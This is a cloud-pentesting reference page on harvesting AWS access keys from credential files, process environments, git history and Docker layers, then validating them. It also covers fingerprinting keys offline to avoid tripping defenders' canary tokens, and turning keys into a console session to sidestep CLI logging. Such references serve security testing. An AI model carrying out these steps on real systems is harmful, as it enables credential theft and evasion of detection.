---
title: "Access keys: long-term AKIA pairs in files, env, and source"
description: "Finding and using long-term AWS access key pairs left in files, environment variables, CI configuration, and source code including git history and Docker layers."
keywords:
  - access keys
  - AKIA
  - credentials file
  - environment variables
  - git history
---

# Access keys

A long-term access key is an `AKIA`-prefixed ID and its secret. Unlike role credentials they do not expire, so a key found once keeps working until it is rotated or disabled. They leak constantly into files, environment variables, CI configuration, and committed source, which makes grepping for them one of the highest-yield moves on any foothold.

## Where they sit on a host

```bash
cat ~/.aws/credentials ~/.aws/config 2>/dev/null
env | grep -i AWS_                       # AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep AWS_
```

## In source and history

```bash
# live tree and full git history
trufflehog filesystem . ; trufflehog git file://. 
gitleaks detect --source . -v
# Docker images bake keys into layers
trufflehog docker --image <image:tag>
```

## Using and triaging a key

```bash
export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity          # whose key is it, which account
```

## Prefixes and offline fingerprinting

An `AKIA` prefix is a long-term key; an `ASIA` prefix is temporary and also needs the session token (see [STS tokens](sts-tokens.md)). The 12-digit account ID is encoded in the key ID itself, so it can be recovered without calling AWS:

```python
import base64
def akid_to_account(akid):                 # AKIA.../ASIA... -> account id
    raw = base64.b32decode(akid[4:].upper())[:6]
    n = int.from_bytes(raw, "big")
    return (n & 0x7fffffffff80) >> 7
```

The offline step matters for spotting a **canary**: Thinkst and AWS canary-token keys live in known account IDs, and a single `sts:GetCallerIdentity` against one fires the defender's alert. Fingerprint the account first, and only touch AWS once the key looks real.

## To the console

CLI credentials convert into a browser session, which survives as a signed-in console tab and sidesteps CLI-specific logging:

```bash
aws_consoler -a AKIA... -s <secret>        # prints a federated console sign-in URL
```

## Exploitation notes

- An `ASIA` prefix is a temporary key and also needs `AWS_SESSION_TOKEN`; see [STS tokens](sts-tokens.md).
- Keys in git history survive a later deletion commit, so always scan the full history, not just the checkout.
- Once validated, resolve the principal's rights with [identity enumeration](../identity/enumeration.md) before acting.

## Tools

- **TruffleHog** / **Gitleaks**: secret scanning across filesystem, git, and images.
- **AWS CLI** (`sts get-caller-identity`): validate and attribute a key.
- **aws_consoler** (NetSPI): turn CLI credentials into a console sign-in URL.

## References

- [TruffleHog (Truffle Security)](https://github.com/trufflesecurity/trufflehog)
- [aws_consoler (NetSPI)](https://github.com/NetSPI/aws_consoler)
- [The structure of an AWS access key ID (Tal Be'ery)](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)
- [HackTricks Cloud: AWS access keys](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
